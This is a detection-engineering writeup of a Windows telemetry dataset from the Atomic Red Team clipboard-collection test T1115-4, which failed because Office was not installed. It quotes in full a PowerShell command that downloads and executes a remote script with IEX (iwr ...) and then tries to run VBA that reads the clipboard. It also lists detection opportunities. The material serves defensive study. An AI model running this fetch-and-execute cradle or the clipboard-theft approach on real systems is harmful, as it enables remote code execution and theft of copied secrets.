# T1115-4: Clipboard Data — Collect Clipboard Data via VBA

## Technique Context

T1115 Clipboard Data is a Collection technique where adversaries access data stored in the system clipboard. The clipboard is commonly used by users to copy and paste text, images, and other data between applications. Adversaries can monitor or access this data to collect potentially sensitive information like passwords, financial data, or confidential documents that users have copied.

This specific test (T1115-4) simulates VBA-based clipboard collection, which is particularly relevant as malicious documents containing VBA macros are a common initial access vector. The technique attempts to use Microsoft Office's VBA automation to access clipboard contents, demonstrating how document-based malware might exfiltrate clipboard data. Detection engineers focus on VBA execution patterns, COM object creation for Office applications, and unusual process behaviors around clipboard APIs.

## What This Dataset Contains

The dataset captures PowerShell execution that attempts to implement clipboard collection via VBA automation. The attack chain includes:

**PowerShell Script Execution**: Security event 4688 shows PowerShell launched with command line `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\" IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile \"C:\AtomicRedTeam\atomics\T1115\src\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"}`.

**Clipboard Manipulation**: The script first sets clipboard content to "Atomic T1115 Test, grab data from clipboard via VBA" using PowerShell's `Set-Clipboard` cmdlet.

**Remote Code Download**: PowerShell script block 4104 shows download of the Invoke-MalDoc.ps1 function via `IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)`.

**VBA Automation Attempt**: The Invoke-MalDoc function (captured in script block ID 0319450e-dabf-4986-b06b-8dc76d9e9b55) attempts to create a COM object for Microsoft Word using `New-Object -ComObject "$officeProduct.Application"`.

**Execution Failure**: PowerShell error 4100 indicates the technique failed: "Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered".

**Network Activity**: Sysmon EID 22 shows DNS resolution for `raw.githubusercontent.com`, and Windows Defender (MsMpEng.exe) network connections to IP 48.211.72.139:443.

**Process Relationships**: Sysmon EID 1 shows PowerShell spawning whoami.exe (PID 23388) and another PowerShell instance (PID 20524), with process access events (EID 10) showing cross-process access patterns.

## What This Dataset Does Not Contain

**Successful VBA Execution**: The technique fails because Microsoft Office is not installed on the test system (error 80040154 "Class not registered"), so there's no actual VBA macro execution or successful clipboard access via COM automation.

**Office Process Activity**: No winword.exe, excel.exe, or other Office application processes are created since Office isn't available.

**Registry Modifications**: The Invoke-MalDoc function attempts to modify `HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\AccessVBOM` but this fails before registry access.

**Clipboard API Calls**: While PowerShell's `Set-Clipboard` cmdlet is used, there are no low-level Windows clipboard API calls that would indicate direct clipboard access via VBA or Win32 APIs.

**File-based VBA Macros**: The test references `C:\AtomicRedTeam\atomics\T1115\src\T1115-macrocode.txt` but no file access events show this macro file being read or executed.

## Assessment

This dataset provides limited utility for detecting T1115 clipboard collection techniques because the core VBA execution fails due to missing Office installation. However, it offers strong detection opportunities for the preparatory phases of clipboard-targeting attacks.

The data is most valuable for detecting PowerShell-based attack staging, remote code download patterns, and failed COM object instantiation attempts that might indicate attempted Office automation attacks on systems lacking Office. The Security 4688 events with full command lines provide excellent visibility into the attack intent, while PowerShell script block logging captures the complete attack payload.

For building detections focused on successful clipboard collection via VBA, this dataset would need to be supplemented with execution on Office-enabled systems. The current failure mode does demonstrate how environmental differences can affect attack execution and the importance of detecting attempt patterns even when techniques fail.

## Detection Opportunities Present in This Data

1. **PowerShell Command Line Analysis**: Security EID 4688 contains suspicious PowerShell execution with clipboard manipulation, remote code download, and Office automation keywords in the command line.

2. **Script Block Content Detection**: PowerShell EID 4104 events capture the complete Invoke-MalDoc function containing VBA automation code and clipboard-related functionality.

3. **Remote Code Download Pattern**: Combination of `IEX (iwr ...)` pattern in PowerShell with network DNS resolution to raw.githubusercontent.com indicates remote PowerShell code execution.

4. **COM Object Instantiation Failures**: PowerShell EID 4100 error events showing failed COM object creation for Office applications may indicate attempted Office automation attacks on non-Office systems.

5. **Clipboard API Usage**: PowerShell `Set-Clipboard` cmdlet usage in script blocks may indicate clipboard manipulation attempts.

6. **Cross-Process Access Patterns**: Sysmon EID 10 shows PowerShell accessing child processes with high privileges (0x1FFFFF), which could indicate process injection preparation.

7. **Suspicious Parent-Child Relationships**: Sysmon EID 1 shows PowerShell spawning whoami.exe and additional PowerShell instances, indicating reconnaissance and execution chaining.

8. **Network IOCs**: DNS queries and connections to GitHub infrastructure for code download combined with PowerShell execution provides network-based detection opportunities.
